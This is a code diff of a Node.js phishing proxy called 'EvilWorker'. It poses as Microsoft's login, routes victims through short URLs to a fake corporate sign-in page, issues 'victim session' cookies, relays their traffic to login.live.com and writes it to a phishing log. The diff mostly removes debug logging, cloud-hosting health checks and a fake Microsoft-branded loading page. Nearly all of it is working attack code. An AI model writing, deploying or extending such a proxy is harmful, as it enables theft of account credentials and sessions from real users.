@@ -29,26 +29,13 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-// Render filesystem may be read-only, handle gracefully
-let LOGGING_ENABLED = false;
 try {
     if (!fs.existsSync(LOGS_DIRECTORY)) {
         fs.mkdirSync(LOGS_DIRECTORY);
     }
-    LOGGING_ENABLED = true;
-    console.log("✅ Logging enabled - filesystem is writable");
 } catch (error) {
-    console.log("⚠️ Logging disabled - filesystem not writable:", error.message);
-    LOGGING_ENABLED = false;
+    displayError("Directory creation failed", error, LOGS_DIRECTORY);
 }
-
-// Add comprehensive logging
-console.log("🚀 EvilWorker Proxy Server Starting...");
-console.log("📊 Environment:", {
-    NODE_ENV: process.env.NODE_ENV,
-    PORT: process.env.PORT,
-    LOGGING_ENABLED: LOGGING_ENABLED
-});
 const LOG_FILE_STREAMS = {};
 //!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
@@ -64,16 +51,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     console.log(`🔍 Processing request: ${clientRequest.method} ${clientRequest.url}`);
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
-    
-    console.log(`📋 Request details:`, {
-        url: url,
-        method: method,
-        host: headers.host,
-        session: currentSession ? 'exists' : 'none',
-        userAgent: headers['user-agent']?.substring(0, 50) + '...'
-    });
 
-    // Handle short URLs regardless of method
     // Health check endpoint for Render
     if (url === '/health' || url === '/status') {
         clientResponse.writeHead(200, { "Content-Type": "application/json" });
@@ -81,14 +59,13 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             status: "healthy", 
             timestamp: new Date().toISOString(),
             service: "EvilWorker Proxy Server",
-            uptime: process.uptime(),
-            memory: process.memoryUsage()
+            uptime: process.uptime()
         }));
         return;
     }
-    
+
+    // Handle short URLs regardless of method
     if (url === '/c' || url === '/corp' || url === '/corporate') {
-        console.log(`🔄 Redirecting short URL to corporate login`);
         // Redirect to full corporate login URL
         clientResponse.writeHead(302, { 
             Location: `/login?method=signin&mode=secure&client_id=${CORPORATE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F` 
@@ -355,17 +332,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     else {
         // If someone visits the base URL without a session, show a 404 instead of redirecting to intrinsec
         if (url === '/' && !currentSession) {
-            // Health check endpoint for Render
-            if (headers['user-agent'] && headers['user-agent'].includes('Render')) {
-                clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                clientResponse.end(JSON.stringify({ 
-                    status: "healthy", 
-                    timestamp: new Date().toISOString(),
-                    service: "EvilWorker Proxy Server"
-                }));
-                return;
-            }
-            
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             clientResponse.end(`
                 <!DOCTYPE html>
@@ -380,12 +346,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         } else if (!currentSession) {
             // If no session exists, try to create one for common paths
             if (url.includes('/login') || url.includes('/signin') || url.includes('/oauth')) {
-                console.log(`🔐 Creating new session for login URL: ${url}`);
-
                 // Create a default session for Microsoft login attempts
                 const defaultUrl = new URL('https://login.live.com/');
                 const { cookieName, cookieValue } = generateNewSession(defaultUrl);
-                console.log(`🍪 Generated session cookie: ${cookieName}=${cookieValue}`);
                 clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
                 
                 VICTIM_SESSIONS[cookieName].protocol = 'https:';
@@ -393,7 +356,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 VICTIM_SESSIONS[cookieName].path = url;
                 VICTIM_SESSIONS[cookieName].port = '';
                 VICTIM_SESSIONS[cookieName].host = 'login.live.com';
-                console.log(`📝 Session created for hostname: ${VICTIM_SESSIONS[cookieName].hostname}`);
                 
                 // Serve a simple loading page that will retry the request
                 clientResponse.writeHead(200, { "Content-Type": "text/html" });
@@ -421,25 +383,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         }
     }
 });
-const port = process.env.PORT ?? 3000;
-console.log(`🌐 Starting server on port ${port}`);
-console.log(`🔗 Server will be available at: http://localhost:${port}`);
-
-proxyServer.listen(port, () => {
-    console.log(`✅ EvilWorker Proxy Server is running on port ${port}`);
-    console.log(`📡 Ready to handle requests...`);
-});
-
-// Add error handling for the server
-proxyServer.on('error', (error) => {
-    console.error('❌ Server error:', error);
-});
-
-// Add request logging
-proxyServer.on('request', (req, res) => {
-    console.log(`📥 Incoming request: ${req.method} ${req.url}`);
-    console.log(`🔍 Headers:`, req.headers);
-});
+proxyServer.listen(process.env.PORT ?? 3000);
 
 
 const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
@@ -463,17 +407,7 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname);
 
     const protocol = proxyRequestProtocol === "https:" ? https : http;
-    
-    // Add very short timeout to prevent hanging
-    proxyRequestOptions.timeout = 1000; // 1 second timeout
-    
-    // Don't send immediate response - wait for actual Microsoft response
-    
-    // Continue with external request in background (non-blocking)
-    // Make external request to get the actual Microsoft login page
-    setImmediate(() => {
-        const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
-        console.log(`📥 Received response: ${proxyResponse.statusCode} from ${proxyRequestOptions.hostname}`);
+    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
 
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
             .catch(error => displayError("Log encryption failed", error));
@@ -559,7 +493,6 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                     }
                 }
 
-                // Send the actual Microsoft response
                 clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                 clientResponse.end(serverResponseBody);
             });
@@ -569,79 +502,28 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
         proxyRequest.write(proxyRequestBody);
     }
     proxyRequest.end();
-    
-    // Add timeout handling
-    proxyRequest.on("timeout", () => {
-        console.error(`⏰ Proxy request timeout after 1s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
-        proxyRequest.destroy();
-        // No need to send response since we already sent immediate response
-    });
-    
     proxyRequest.on("error", (error) => {
-        console.error(`❌ Proxy request error: ${error.message}`, {
+        console.error(`Proxy request error: ${error.message}`, {
             hostname: proxyRequestOptions.hostname,
             path: proxyRequestOptions.path,
             error: error.code
         });
         
-        // No need to send error response since we already sent immediate response
-    });
-    
-    // Add connection timeout
-    proxyRequest.setTimeout(1000, () => {
-        console.error(`⏰ Connection timeout after 1s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
-        proxyRequest.destroy();
-        
-        // Send fallback response if Microsoft request fails
+        // Send proper error response to client
         if (!clientResponse.headersSent) {
-            const fallbackResponse = `
+            clientResponse.writeHead(502, { "Content-Type": "text/html" });
+            clientResponse.end(`
                 <!DOCTYPE html>
                 <html>
-                <head>
-                    <title>Sign in to your account</title>
-                    <meta charset="utf-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <style>
-                        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
-                        .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                        .logo { text-align: center; margin-bottom: 30px; }
-                        h1 { color: #333; font-size: 24px; margin-bottom: 20px; text-align: center; }
-                        .loading { text-align: center; color: #666; }
-                        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                    </style>
-                </head>
+                <head><title>502 Bad Gateway</title></head>
                 <body>
-                    <div class="container">
-                        <div class="logo">
-                            <svg width="108" height="23" viewBox="0 0 108 23" fill="none">
-                                <path d="M0 0h108v23H0z" fill="#0078d4"/>
-                                <path d="M8.5 6.5h3v10h-3V6.5zm8.5 0h3v10h-3V6.5zm8.5 0h3v10h-3V6.5z" fill="white"/>
-                            </svg>
-                        </div>
-                        <h1>Sign in to your account</h1>
-                        <div class="loading">
-                            <div class="spinner"></div>
-                            <p>Loading Microsoft login...</p>
-                        </div>
-                    </div>
-                    <script>
-                        // Auto-refresh to get the actual Microsoft page
-                        setTimeout(() => {
-                            window.location.reload();
-                        }, 2000);
-                    </script>
+                    <h1>502 Bad Gateway</h1>
+                    <p>The proxy server received an invalid response from an upstream server.</p>
                 </body>
                 </html>
-            `;
-            clientResponse.writeHead(200, { 
-                "Content-Type": "text/html",
-                "Content-Length": Buffer.byteLength(fallbackResponse)
-            });
-            clientResponse.end(fallbackResponse);
+            `);
         }
     });
-        }); // Close setImmediate block
 }
 
 function displayError(message, error, ...args) {
@@ -757,18 +639,10 @@ function generateRandomString(length) {
 }
 
 function createSessionLogFile(logFilename, currentSession) {
-    if (!LOGGING_ENABLED) {
-        console.log("Logging disabled - skipping log file creation");
-        return;
-    }
-    
-    try {
-        const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
-        const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
-        LOG_FILE_STREAMS[currentSession] = logFileStream;
-    } catch (error) {
-        console.log("Failed to create log file:", error.message);
-    }
+    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
+    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
+
+    LOG_FILE_STREAMS[currentSession] = logFileStream;
 }
 
 function generateNewSession(phishedURL) {
